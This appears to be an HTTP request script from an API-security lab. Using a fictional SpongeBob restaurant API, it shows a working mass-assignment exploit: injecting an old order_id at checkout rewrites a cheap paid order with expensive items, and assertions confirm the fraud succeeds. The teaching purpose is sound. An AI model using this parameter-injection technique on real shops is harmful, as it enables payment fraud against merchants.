# @import ../common/setup.http
@base = {{base_host}}/v103

### In the new version, Sandy has implemented a cart-based checkout flow.
# Now to place an order, ca customer needs to create a cart, add items to it, and then checkout.
# Plankton creates a new _cheap_ cart
# @name cheap_cart
POST {{base}}/cart
Authorization: {{plankton_auth}}

### Plankton adds a side of fries to his cart
POST {{base}}/cart/{{cheap_cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "2" }

### Plankton checks out his cart
# @name cheap_order
POST {{base}}/cart/{{cheap_cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=0&delivery_address=Chum Bucket

### Now Plankton creates a new _expensive_ cart
# @name expensive_cart
POST {{base}}/cart
Authorization: {{plankton_auth}}

### He adds an expensive item to his cart
POST {{base}}/cart/{{expensive_cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "6" }


### Plankton checks out the expensive cart but injects his old order ID
# @name exploit
POST {{base}}/cart/{{expensive_cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "delivery_address": "Chum Bucket",
  "order_id": "{{cheap_order.order_id}}"
}

?? status == 201
?? js response.parsedBody.order_id == {{cheap_order.order_id}}
?? js response.parsedBody.items[0].item_id == 6

### The order was updated with expensive items, but he was only charged for fries!
GET {{base}}/account/credits
Authorization: {{plankton_auth}}


### Plankton's cheap order was rewritten with the expensive items!
GET {{base}}/orders
Authorization: {{plankton_auth}}

?? status == 200
?? js response.parsedBody[0].items[0].item_id == 6
